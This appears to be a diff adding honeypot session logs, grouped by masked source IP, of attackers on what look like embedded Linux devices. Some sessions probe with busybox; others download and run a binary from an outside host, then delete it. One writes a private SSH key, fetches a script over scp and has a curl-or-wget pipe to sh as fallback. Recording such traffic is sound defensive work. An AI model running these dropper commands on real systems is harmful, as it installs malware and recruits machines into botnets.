@@ -1,0 +1,51 @@
+=== session 86c47f4f3519 | src_ip 139.135.44.XYZ | 2026-08-25T15:55:05.461789Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x57\x5a\x58\x53\x45\x45'
+
+=== session 2f9257c3da26 | src_ip 45.198.224.XYZ | 2026-08-25T18:31:07.480471Z ===
+(cd /tmp; wget http://5.182.210.XYZ/ok; curl -O http://5.182.210.XYZ/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
+cd /tmp
+wget http://5.182.210.XYZ/ok
+curl -O http://5.182.210.XYZ/ok
+chmod +x ok
+sh ok
+rm -rf ok.1
+rm -rf ok
+(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.XYZ/ok;wget http://5.182.210.XYZ/ok;/userfs/bin/wget http://5.182.210.XYZ/ok;curl -O http://5.182.210.XYZ/ok;busybox curl -O http://5.182.210.XYZ/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &
+cd /tmp
+cd /var/tmp
+cd /dev
+rm -rf ok ok.1
+busybox wget http://5.182.210.XYZ/ok
+wget http://5.182.210.XYZ/ok
+/userfs/bin/wget http://5.182.210.XYZ/ok
+curl -O http://5.182.210.XYZ/ok
+busybox curl -O http://5.182.210.XYZ/ok
+chmod 777 ok
+./ok
+sh ok
+busybox sh ok
+rm -rf ok ok.1
+exit
+
+=== session badbc7050ac0 | src_ip 175.107.37.XYZ | 2026-08-25T19:00:24.105664Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x51\x52\x42\x45\x43\x53'
+
+=== session 7d67c6fe949a | src_ip 130.12.180.XYZ | 2026-08-25T19:29:34.787471Z ===
+uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XYZ:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.XYZ/sh || curl -sk https://217.60.195.XYZ/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh
+
